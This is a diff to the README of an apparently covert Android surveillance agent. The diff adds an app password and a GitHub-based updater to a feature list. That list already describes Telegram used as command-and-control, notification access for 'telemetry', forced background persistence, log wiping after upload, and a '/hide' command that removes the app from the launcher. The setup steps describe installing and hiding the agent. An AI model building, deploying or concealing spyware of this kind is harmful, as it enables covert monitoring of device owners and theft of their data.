@@ -26,6 +26,8 @@ The application is built as a **Headless Android Application** with a focus on s
 2.  **Resilience**: Uses `WorkManager` for guaranteed background execution even on restricted battery modes.
 3.  **Data Hygiene**: Logs are securely wiped (overwritten with zeros) immediately after successful upload.
 4.  **Serverless**: Uses Telegram as the C2 infrastructure, removing the need for VPS maintenance.
+5.  **App Lock**: UI is protected by a password (AES-256 encrypted) to prevent unauthorized access.
+6.  **In-App Updater**: Checks for updates from GitHub Releases and installs them securely.
 
 ## Commands
 Control the agent via your Telegram Bot:
@@ -41,7 +43,8 @@ This application is **NOT** available on the Play Store due to its use of high-p
     *   **Notification Access**: Required for telemetry.
     *   **Ignore Battery Opts**: Required for background persistence.
 3.  Enter your Telegram Bot Token and Chat ID.
-4.  (Optional) Send `/hide` to vanish from the launcher.
+4.  **Set App Password**: Secure the app interface with a password.
+5.  (Optional) Send `/hide` to vanish from the launcher.
 
 ## Build Instructions
 1.  **Prerequisites**: JDK 21, Android SDK API 34.
